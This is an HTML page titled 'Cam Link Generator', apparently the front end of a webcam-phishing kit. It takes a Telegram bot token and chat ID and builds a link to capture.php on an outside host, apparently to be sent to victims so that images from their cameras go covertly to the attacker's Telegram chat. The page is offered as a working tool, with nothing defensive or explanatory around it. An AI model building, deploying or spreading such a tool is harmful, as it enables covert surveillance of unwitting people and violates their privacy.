<!DOCTYPE html>
<html>
<head>
<title>Setup Bot</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  
  body{
    background: #0A0A11;
    font-family:Arial;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
  }

  .wrapper{
    display:flex;
    flex-direction:column;
    align-items:center;
    gap:15px;
    width:100%;
    max-width:330px;
  }

  .box{
    width:100%;
    background: #1E1E1E;
    padding:15px;
    border-radius:15px;
    border: 1px solid rgba(255, 255, 255, 0.15);
    text-align:center;
  }

  .inputBox{
    width:100%;
    padding:12px;
    background: #040407;
    color: #fff;
    margin-top:12px;
    border:1px solid #3B82F6;
    border-radius:10px;
    font-size:16px;
  }

  .btn{
    width:100%;
    padding:12px;
    margin-top:25px;
    background: linear-gradient(to right, #3b82f6, #1d4ed8);
    border:none;
    border-radius:10px;
    color:white;
    font-size:18px;
    cursor:pointer;
    font-weight:600;
  }

  #linkBox{
    margin-top:15px;
    word-break:break-all;
    text-align:center;
  }

  #linkBox a {
    color: #ffffff;
    text-decoration: none;
    font-weight: bold;
  }

  h2{
    text-align:center;
    color:#fff;
    font-size:22px;
  }

  .status-box {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 6px 12px;
    border-radius: 50px;
    background: rgba(0, 255, 20, 0.15);
    border: 1px solid #00FF14;
    color: #00FF14;
    font-weight: 600;
    font-size: 0.85rem;
    box-shadow: 0 0 10px rgba(0,255,20,0.25);
  }

  .status-dot {
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background: #00FF14;
    box-shadow: 0 0 6px #00FF14;
    animation: blink 1.5s infinite;
  }

  @keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
  }
</style>
</head>
<body>
  <div class="wrapper">
    <div class="box">
      <h2>Cam Link Generator</h2>
      <input class="inputBox" id="token" placeholder="Enter Telegram Bot Token">
      <input class="inputBox" id="chatid" placeholder="Enter Telegram Chat ID">
      <button class="btn" onclick="generateLink()">Generate Link</button>
      <div id="linkBox"></div>
    </div>
    
    <div class="status-box">
      <span class="status-dot"></span> Online
    </div>
  </div>

<script>
function generateLink(){
  const token = document.getElementById("token").value.trim();
  const chatid = document.getElementById("chatid").value.trim();
  if(token === "" || chatid === "") return;
  const link = `https://zingo.42web.io/capture.php?token=${encodeURIComponent(token)}&chatid=${encodeURIComponent(chatid)}`;
  document.getElementById("linkBox").innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
}
</script>
</body>
</html>